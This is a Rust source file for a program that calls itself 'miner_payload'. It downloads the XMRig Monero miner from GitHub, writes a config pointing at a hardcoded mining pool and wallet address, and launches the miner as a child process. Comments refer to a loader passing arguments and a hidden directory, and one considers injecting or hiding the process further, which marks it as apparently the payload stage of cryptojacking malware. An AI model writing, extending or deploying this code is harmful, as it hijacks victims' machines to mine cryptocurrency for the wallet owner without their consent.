mod config;

use std::env;
use std::fs::{self, File};
// use std::io::Write; // Unused
use std::path::Path;
use std::process::{Command, Stdio};
use tokio::time::{sleep, Duration}; // Note: This Duration conflicts with std::time::Duration, but the new code uses tokio's.
use config::MinerConfig;
use reqwest; // Implied by the new code
use zip; // Implied by the new code

const DEFAULT_POOL: &str = "gulf.moneroocean.stream:10128";
const DEFAULT_WALLET: &str = "47ekr2BkJZ4KgCt6maJcrnWhz9MfMfetPPnQSzf4UyXvAKTAN3sVBQy6R9j9p7toHa9yPyCqt9n43N3psvCwiFdHCJNNouP";
const XMRIG_URL: &str = "https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-windows-x64.zip";

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    // 1. Parse Arguments (Loader passes: pool wallet threads)
    let args: Vec<String> = env::args().collect();
    let pool_url = if args.len() > 1 { &args[1] } else { DEFAULT_POOL };
    let wallet = if args.len() > 2 { &args[2] } else { DEFAULT_WALLET };
    let threads = if args.len() > 3 { args[3].parse().unwrap_or(1) } else { 1 };

    println!("miner_payload: Initializing...");
    println!("Target Pool: {}", pool_url);
    println!("Target Wallet: {}...", &wallet[0..8]);

    // 2. Setup Environment
    let current_dir = env::current_dir()?;
    let xmrig_exe_name = "xmrig.exe"; // Always use standard name internal to the hidden dir
    let xmrig_path = current_dir.join(xmrig_exe_name);

    // 3. Ensure XMRig exists
    if !xmrig_path.exists() {
        println!("[-] xmrig.exe not found. Downloading...");
        download_and_extract_xmrig(&current_dir).await?;
    } else {
        println!("[+] xmrig.exe found.");
    }

    // 4. Generate Config
    println!("[*] Generating config.json...");
    let config = MinerConfig::new(pool_url, wallet, threads);
    let config_json = serde_json::to_string_pretty(&config)?;
    fs::write(current_dir.join("config.json"), config_json)?;

    // 5. Execute Miner
    println!("[*] Launching XMRig...");
    
    // In a real scenario, we might want to inject or hide this process further.
    // For this payload, we spawn it as a child.
    let mut child = Command::new(&xmrig_path)
        // .arg("--config=config.json") // Implicit
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()?;

    println!("[+] XMRig running (PID: {})", child.id());

    // Monitor loop
    loop {
        match child.try_wait() {
            Ok(Some(status)) => {
                println!("[-] XMRig exited with: {}", status);
                break;
            }
            Ok(None) => {
                // Still running
                sleep(Duration::from_secs(10)).await;
            }
            Err(e) => {
                eprintln!("Error waiting for XMRig: {}", e);
                break;
            }
        }
    }

    Ok(())
}

async fn download_and_extract_xmrig(dest_dir: &Path) -> Result<(), Box<dyn std::error::Error>> {
    let zip_path = dest_dir.join("xmrig.zip");

    // A. Download ZIP
    println!("Downloading from: {}", XMRIG_URL);
    let response = reqwest::get(XMRIG_URL).await?;
    if !response.status().is_success() {
        return Err(format!("Download failed: {}", response.status()).into());
    }
    let content = response.bytes().await?;
    fs::write(&zip_path, &content)?;

    // B. Extract ZIP
    println!("Extracting zip...");
    let file = File::open(&zip_path)?;
    let mut archive = zip::ZipArchive::new(file)?;

    for i in 0..archive.len() {
        let mut file = archive.by_index(i)?;
        let outpath = match file.enclosed_name() {
            Some(path) => path.to_owned(),
            None => continue,
        };

        // We only care about xmrig.exe
        // The zip structure is usually xmrig-6.24.0/xmrig.exe
        if let Some(name) = outpath.file_name() {
            if name.to_string_lossy() == "xmrig.exe" {
                println!("Found executable: {:?}", name);
                let target_path = dest_dir.join("xmrig.exe");
                let mut outfile = File::create(&target_path)?;
                std::io::copy(&mut file, &mut outfile)?;
            }
        }
    }

    // Cleanup
    let _ = fs::remove_file(zip_path);
    
    // Check release
    if !dest_dir.join("xmrig.exe").exists() {
        return Err("xmrig.exe not found in downloaded zip".into());
    }

    Ok(())
}
